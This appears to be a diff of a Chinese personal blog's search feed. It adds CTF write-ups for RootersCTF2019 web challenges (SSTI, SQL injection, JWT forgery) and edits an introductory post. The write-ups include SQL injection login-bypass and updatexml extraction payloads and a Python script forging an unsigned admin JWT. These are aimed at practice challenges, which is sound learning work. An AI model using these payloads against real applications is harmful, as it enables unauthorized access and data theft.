@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>RootersCTF2019</title>
+      <link href="/2025/10/30/RootersCTF2019/"/>
+      <url>/2025/10/30/RootersCTF2019/</url>
+      
+        <content type="html"><![CDATA[<h2 id="RootersCTF2019-I"><a href="#RootersCTF2019-I" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>一道ssti，需要用工具扫参数（结果是?name）</p><p>然后直接秒了就行了，因为基本上没过滤什么！没什么说的！</p><h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p>过滤</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SLEEP &#x27; &quot; OR - BENCHMARK</span><br></pre></td></tr></table></figure><p>一开始还不知道什么意思，后面才知道输入的原来是密码，那么就试试万能密码呗</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 || 1=1 limit 0,1<span class="params">#</span></span><br></pre></td></tr></table></figure><p>页面回显只能回显一条数据，所以用个limit</p><p>然后就是报错也可以</p><p>过滤引号，字段填表那里用16进制就好了</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字段：1 || updatexml(1,concat(0x7e,(select group<span class="built_in">_</span>concat(column<span class="built_in">_</span>name)from information<span class="built_in">_</span>schema.columns where table<span class="built_in">_</span>schema=database() and table<span class="built_in">_</span>name=0x7573657273),0x7e),1)<span class="params">#</span></span><br><span class="line">密码：1 || updatexml(1,concat(0x7e,(select group<span class="built_in">_</span>concat(uniqueid) from users),0x7e),1)<span class="params">#</span></span><br></pre></td></tr></table></figure><p>然后拿第一个去查询就好了！</p><h2 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h2><p>注册登录，然后一个文件上传接口！</p><p>后缀名没啥过滤啊，尝试php后缀，虽然传上去了，但是访问就是下载说明没解析！那就只能在试试图片马了，但是话又说回来，php解析不了，肯定用不了.user.ini了！</p><p>后面发现cookie部分是个jwt，那么肯定就是jwt伪造了！一开始是用脚本改加密但是不行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># 能进行base64的加密解密都是字节类型</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jwtBase64Encode</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(x.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode().replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;_&quot;</span>).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">header = <span class="string">&#x27;&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;None&quot;&#125;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;user&quot;:&quot;admin&quot;&#125; &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(jwtBase64Encode(header) + <span class="string">&#x27;.&#x27;</span> + jwtBase64Encode(payload) + <span class="string">&#x27;.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后就是找密钥：1，使用工具爆破 2，看看有没有目录泄露。爆破没出来，有个&#x2F;robots.txt然后把密钥搞到，伪造就好了</p><p><img src="/images/achieve/2025/10/6.png"></p><p>然后伪造之后有个flag的图片，抓包抓不了，又没回显，curl外带呗</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://6919af93-4974-40e5-9bf9-e1cc56c29838.node5.buuoj.cn/static/128e8ea7ce4a37b7100fb40b28c01280/flag.png</span><br></pre></td></tr></table></figure><h2 id="RootersCTF2019-notifyxapi"><a href="#RootersCTF2019-notifyxapi" class="headerlink" title="[RootersCTF2019]notifyxapi"></a>[RootersCTF2019]notifyxapi</h2><p>注册的时候伪造admin就出来了，不难！</p><p>总的来说这个比赛可以说是非常简单！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 赛题 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sql </tag>
+            
+            <tag> curl </tag>
+            
+            <tag> ssti </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>flask下的内存马</title>
       <link href="/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/"/>
       <url>/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/</url>
@@ -85,11 +114,11 @@
     
     
     <entry>
-      <title>Hello World</title>
+      <title>新的开始</title>
       <link href="/2025/10/23/hello-world/"/>
       <url>/2025/10/23/hello-world/</url>
       
-        <content type="html"><![CDATA[<p><img src="/images/achieve/2025/10/start.jpg"></p><p>感谢师傅们的文章！感谢师傅们的帮助！</p><p>我们在这个数字世界中相遇，本身就是一种奇妙的缘分。 </p><p><strong>新的旅程要开始了！</strong>期待与各位师傅们在道路上共同前行！😁😁😁</p>]]></content>
+        <content type="html"><![CDATA[<p><img src="/images/achieve/2025/10/start.jpg"></p><p>早就想弄个blog记录学习了，但是之前一直觉得麻烦就一直在csdn发</p><p><a href="https://blog.csdn.net/2403_88003384?spm=1000.2115.3001.5343">rufeii_-CSDN博客</a></p><p>但是csdn这byd广告太多了，另外就是它的搜索检索有问题，于是就觉得不能再拖了！</p><p>自己还是太菜了，每天进步一点点吧，另外就是慢慢地学，不要急于求成！</p>]]></content>
       
       
       <categories>
